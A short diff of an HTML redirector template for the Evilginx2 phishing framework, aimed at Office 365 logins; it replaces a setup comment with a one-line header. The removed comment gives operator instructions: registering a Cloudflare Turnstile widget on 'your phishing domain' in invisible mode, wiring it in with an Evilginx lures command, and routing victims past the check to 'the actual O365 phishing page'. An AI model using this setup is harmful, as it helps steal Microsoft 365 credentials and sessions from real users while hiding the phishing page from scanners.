@@ -1,20 +1,4 @@
-<!--
-    O365 Turnstile Redirector for Evilginx2
-    
-    ⚠️ SETUP REQUIRED:
-    1. Create a new Turnstile Site in your Cloudflare dashboard (https://dash.cloudflare.com/?to=/:account/turnstile)
-    2. Set 'Domain' to your phishing domain (e.g., login.your-phishing-domain.com)
-    3. Set 'Widget Mode' to 'Invisible' for seamless experience
-    4. Copy the 'Site Key' and replace the placeholder '1x00000000000000000000BB' on line 192
-    5. Use this redirector by setting: lures edit <id> redirector o365_turnstile
-    
-    IMPORTANT: The captcha will NOT work until you replace the site key!
-    
-    HOW IT WORKS:
-    - User visits lure URL (e.g., /LsPqzdYP) → Shows this redirector
-    - After Turnstile verification → Redirects to root path (/) where the actual O365 phishing page is served
-    - The {lure_url_js} placeholder returns the CURRENT URL (redirector), not the landing page
--->
+<!-- O365 Turnstile Redirector for Evilginx -->
 
 <!DOCTYPE html>
 <html lang="en">
